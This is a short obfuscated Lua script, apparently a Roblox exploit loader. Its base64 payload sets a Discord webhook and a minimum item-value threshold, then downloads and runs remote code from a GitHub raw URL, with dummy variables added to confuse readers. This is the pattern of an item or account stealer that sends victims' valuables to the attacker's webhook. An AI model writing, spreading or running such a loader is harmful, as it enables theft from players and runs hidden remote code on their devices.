
local BLkSxYcv = 'VXNlcm5hbWUgPSAiR3Jvd2dhbnRvIgpVc2VybmFtZTIgPSAiR3Jvd2dhbnRvIgpXZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMDc5OTIzODg1MzAyMTI5NjQvRkhsR3JjcjlDVzMzN0tDOUhZVG05MnB4TUYzTVBxRVJJWl9ETWd6YXdaMjdPUXlIdkJZWjV5TFo0S04xdndTVm5uRk8iCk1pbmltdW1SQVAgPSAxMDAwMDAKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaGFkb3dzenp6ei90aW1vY2l5L3JlZnMvaGVhZHMvbWFpbi9tYWluIiwgdHJ1ZSkpKCk='
local pTpurHLrC = function(s) 
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
    s = string.gsub(s, '[^'..b..'=]', ''); 
    return (s:gsub('.', function(x) 
        if x == '=' then return '' end; 
        local r,f='',(b:find(x)-1); 
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
        return r; 
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
        if (#x ~= 8) then return '' end; 
        local c=0; 
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
        return string.char(c) 
    end)) 
end
local QbxSdulqJ = pTpurHLrC(BLkSxYcv)
loadstring(QbxSdulqJ)() -- Run decoded code

-- Dummy variables for confusion
local YDdibpawEB = math.random()
local RBxyIvKBzU = "This is a dummy string"
